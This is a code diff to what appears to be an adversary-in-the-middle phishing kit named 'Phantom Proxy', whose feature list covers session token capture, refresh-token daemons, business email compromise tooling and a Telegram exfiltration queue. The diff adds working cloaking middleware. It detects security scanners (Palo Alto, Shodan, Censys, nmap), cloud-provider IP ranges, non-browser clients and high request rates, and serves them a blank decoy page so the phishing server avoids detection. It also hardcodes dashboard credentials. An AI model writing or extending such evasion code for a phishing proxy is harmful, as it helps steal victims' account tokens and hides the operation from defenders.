@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v8.0 — ULTIMATE COMPLETE EDITION
+// 🥔 PHANTOM PROXY v8.1 — ULTIMATE COMPLETE EDITION
 // ============================================================
-// 🔥 FEATURES:
+// 🔥 FEATURES (v8.1):
 //   ✅ EvilWorker Proxy — Real AiTM with Service Worker
 //   ✅ Phantom Dashboard — Full UI with logs, tokens, recon
 //   ✅ PRT Engine — Auto-scan, health, refresh
@@ -15,7 +15,8 @@
 //   ✅ sccauth → JWT Conversion
 //   ✅ Token Health-Check
 //   ✅ Auto-Refresh Daemons (30 min)
-//   ✅ NO ANTI-BOT (removed as requested)
+//   ✅ Scanner Blocker — Blocks Palo Alto, scanners, cloud IPs, rate limits, UA filters
+//   ✅ NO ANTI-BOT (replaced with active scanner blocker)
 // ============================================================
 
 const http = require("http");
@@ -163,7 +164,176 @@ function logDebug(message, data = null) {
     console.log(JSON.stringify(entry));
 }
 
-// ── ✅ NO ANTI-BOT (removed as requested) ──
+// ============================================================
+// 🛡️ SCANNER BLOCKER MIDDLEWARE (v8.1)
+// ============================================================
+// ── ✅ Static blocklist (add your own bad IPs here)
+const BLOCKED_IPS = new Set([
+  '101.36.112.195',
+  '205.210.31.21', '205.210.31.45', '205.210.31.46', '205.210.31.185',
+  '198.235.24.9',
+  // Add more as you discover
+]);
+
+// ── ✅ Scanner User-Agent patterns (case-insensitive)
+const SCANNER_UA_REGEX = [
+  /palos?alto/i,
+  /hello from/i,
+  /shodan/i,
+  /censys/i,
+  /internetmeasurement/i,
+  /duckduckbot/i,
+  /scanner/i,
+  /vulnerability/i,
+  /wpscan/i,
+  /nmap/i,
+  /masscan/i,
+  /zgrab/i,
+];
+
+// ── ✅ Cloud provider CIDR ranges (expand as needed)
+const CLOUD_CIDRS = [
+  '64.225.0.0/16',   // DigitalOcean NYC
+  '157.245.0.0/16',  // DigitalOcean SFO
+  '161.35.0.0/16',   // DigitalOcean SFO2
+  '159.89.0.0/16',   // DigitalOcean AMS
+  '104.248.0.0/16',  // DigitalOcean TOR
+  '46.101.0.0/16',   // DigitalOcean FRA
+  '178.62.0.0/16',   // DigitalOcean LON
+  '18.0.0.0/8',      // AWS US East (broad)
+  '54.0.0.0/8',      // AWS US West / others
+  '34.0.0.0/8',      // Google Cloud / other
+];
+
+function ipInCIDR(ip, cidr) {
+  const [range, bits] = cidr.split('/');
+  const mask = ~((1 << (32 - bits)) - 1);
+  const ipParts = ip.split('.').map(Number);
+  const rangeParts = range.split('.').map(Number);
+  const ipInt = (ipParts[0] << 24) + (ipParts[1] << 16) + (ipParts[2] << 8) + ipParts[3];
+  const rangeInt = (rangeParts[0] << 24) + (rangeParts[1] << 16) + (rangeParts[2] << 8) + rangeParts[3];
+  return (ipInt & mask) === (rangeInt & mask);
+}
+
+function isCloudIP(ip) {
+  for (const cidr of CLOUD_CIDRS) {
+    if (ipInCIDR(ip, cidr)) return true;
+  }
+  return false;
+}
+
+function isScannerIP(ip) {
+  if (BLOCKED_IPS.has(ip)) return true;
+  return false;
+}
+
+function isScannerUserAgent(ua) {
+  if (!ua) return false;
+  for (const pattern of SCANNER_UA_REGEX) {
+    if (pattern.test(ua)) return true;
+  }
+  return false;
+}
+
+// ── ✅ Browser header check (real browsers send these)
+function hasBrowserHeaders(headers) {
+  const required = ['accept-language', 'accept-encoding', 'cache-control'];
+  let missing = 0;
+  for (const h of required) {
+    if (!headers[h]) missing++;
+  }
+  return missing <= 1;
+}
+
+// ── ✅ Rate limiting (per IP per minute)
+const requestCounts = new Map();
+const RATE_LIMIT = 30;
+const RATE_WINDOW = 60000;
+
+function isRateLimited(ip) {
+  const now = Date.now();
+  const entry = requestCounts.get(ip) || { count: 0, reset: now + RATE_WINDOW };
+  if (now > entry.reset) {
+    entry.count = 1;
+    entry.reset = now + RATE_WINDOW;
+    requestCounts.set(ip, entry);
+    return false;
+  }
+  entry.count++;
+  if (entry.count > RATE_LIMIT) {
+    return true;
+  }
+  requestCounts.set(ip, entry);
+  return false;
+}
+
+// ── ✅ Send decoy response (200 OK with empty HTML)
+function sendDecoy(res) {
+  res.setHeader('Content-Type', 'text/html');
+  res.statusCode = 200;
+  res.end('<!DOCTYPE html><html><head><title>OK</title></head><body></body></html>');
+}
+
+// ── ✅ Log blocked scanners
+function logScanner(reason, ip, url, ua = '') {
+  const entry = {
+    timestamp: new Date().toISOString(),
+    reason,
+    ip,
+    url,
+    userAgent: ua,
+  };
+  console.warn('[SCANNER BLOCK]', JSON.stringify(entry));
+  // Optionally write to a file
+  const logDir = path.join(__dirname, 'scanner_logs');
+  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
+  fs.appendFileSync(path.join(logDir, 'blocked.log'), JSON.stringify(entry) + '\n');
+}
+
+// ── ✅ Main scanner blocker middleware
+function scannerBlocker(req, res, next) {
+  // Get real client IP
+  const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
+
+  // 1. Static blocklist
+  if (isScannerIP(ip)) {
+    logScanner('IP blocklist', ip, req.url, req.headers['user-agent']);
+    return sendDecoy(res);
+  }
+
+  // 2. User-Agent scanner patterns
+  const ua = req.headers['user-agent'] || '';
+  if (isScannerUserAgent(ua)) {
+    logScanner('User-Agent pattern', ip, req.url, ua);
+    return sendDecoy(res);
+  }
+
+  // 3. Missing browser headers (but allow if UA is from a known browser)
+  if (!hasBrowserHeaders(req.headers) && !ua.includes('Mozilla')) {
+    logScanner('Missing browser headers', ip, req.url, ua);
+    return sendDecoy(res);
+  }
+
+  // 4. Rate limiting (prevents directory brute-force)
+  if (isRateLimited(ip)) {
+    logScanner('Rate limit exceeded', ip, req.url, ua);
+    return sendDecoy(res);
+  }
+
+  // 5. Cloud IP without internal referer (scanner)
+  if (isCloudIP(ip)) {
+    const referer = req.headers.referer || '';
+    if (!referer.includes(req.headers.host)) {
+      logScanner('Cloud IP without internal referer', ip, req.url, ua);
+      return sendDecoy(res);
+    }
+  }
+
+  // If all checks pass, continue to next handler
+  next();
+}
+
+// ── ✅ No-op for legacy anti-bot hooks (replaced by scannerBlocker)
 function antiBotMiddleware(req, res, next) { next(); }
 function botTrapMiddleware(req, res, next) { next(); }
 const limiter = (req, res, next) => next();
@@ -1395,8 +1565,10 @@ const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
 const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
 dashApp.use(corsMiddleware);
-dashApp.use(antiBotMiddleware);
-dashApp.use(botTrapMiddleware);
+// 🛡️ Apply scanner blocker to dashboard as well (protects admin endpoints)
+dashApp.use(scannerBlocker);
+dashApp.use(antiBotMiddleware); // no-op, kept for compatibility
+dashApp.use(botTrapMiddleware); // no-op
 
 if (basicAuth) {
     dashApp.use(basicAuth({
@@ -2382,8 +2554,10 @@ dashApp.get('/api/replay/:filename', (req, res) => {
 const app = express();
 
 app.use(corsMiddleware);
-app.use(antiBotMiddleware);
-app.use(botTrapMiddleware);
+// 🛡️ Apply scanner blocker to ALL incoming requests
+app.use(scannerBlocker);
+app.use(antiBotMiddleware); // no-op
+app.use(botTrapMiddleware); // no-op
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -2637,7 +2811,7 @@ function setupGracefulShutdown(server, wss) {
 const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, '0.0.0.0', () => {
-    logInfo(`✅ PHANTOM PROXY v8.0 ULTIMATE running on port ${PORT}`);
+    logInfo(`✅ PHANTOM PROXY v8.1 ULTIMATE running on port ${PORT}`);
     logInfo(`🔐 Dashboard: /dash (auth: svrpsdev/Cozysarps18!)`);
     logInfo(`📱 Device Code: /device`);
     logInfo(`📧 Webmail: /webmail`);
@@ -2648,10 +2822,10 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     logInfo(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
     logInfo(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
     logInfo(`📤 Telegram Queue: ${telegramQueue.length} pending`);
-    logInfo(`🛡️ Anti-Bot: REMOVED (as requested)`);
+    logInfo(`🛡️ Scanner Blocker: ACTIVE (blocks scanners, cloud IPs, rate limits, UA filters)`);
     logInfo(`🔄 esctx/sccauth → JWT: Active`);
     logInfo(`✅ Token Health-Check: Active`);
-    logInfo('✅ All features integrated — Complete Ultimate Edition');
+    logInfo('✅ All features integrated — Complete Ultimate Edition v8.1');
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
@@ -2693,5 +2867,5 @@ process.on('unhandledRejection', (err) => {
     logError('Unhandled Rejection:', err);
 });
 
-logInfo('✅ PHANTOM PROXY v8.0 ULTIMATE startup complete!');
-logInfo('🔥 Everything combined — Proxy, Dashboard, PRT, Graph API, Device Code, AI BEC, Conversions, Health-Check, Auto-Refresh, Telegram Queue');
+logInfo('✅ PHANTOM PROXY v8.1 ULTIMATE startup complete!');
+logInfo('🔥 Everything combined — Proxy, Dashboard, PRT, Graph API, Device Code, AI BEC, Conversions, Health-Check, Auto-Refresh, Telegram Queue, and Scanner Blocker.');
